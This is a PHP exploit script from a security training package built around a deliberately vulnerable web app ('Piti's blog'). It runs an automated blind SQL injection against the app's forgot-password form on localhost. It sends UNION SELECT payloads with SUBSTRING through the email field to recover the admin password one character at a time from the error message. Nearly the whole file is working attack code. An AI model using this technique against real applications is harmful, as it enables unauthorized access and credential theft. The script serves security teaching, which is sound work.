#!/usr/bin/php
<?php

/*
    Piti's blog is a very vulnerable web app written to illustrate a php security training
    Copyright (C) 2012 Manuel Silvoso

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

$url = "http://localhost/?action=forgot.php";
$user = 'admin';
$inject1[0] = "e' UNION SELECT * FROM users WHERE login='$user' AND SUBSTRING(password,";
$inject1[1] = ",1)='";
for ($i=1; $i<30; $i++) {
    $found=false;
    for ($t=97; $t<123; $t++) {
        $inject2 = $inject1[0].$i.$inject1[1].rawurlencode(chr($t));
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);

        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$inject2");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $page = curl_exec($ch);

        curl_close($ch);

        if (!preg_match('/Email does not exist in the database/', $page)) {
            $found = true;
            break;
        }
    }
    if ($found) {
        echo chr($t);
    } else {
        break;
    }
}
echo "\n";
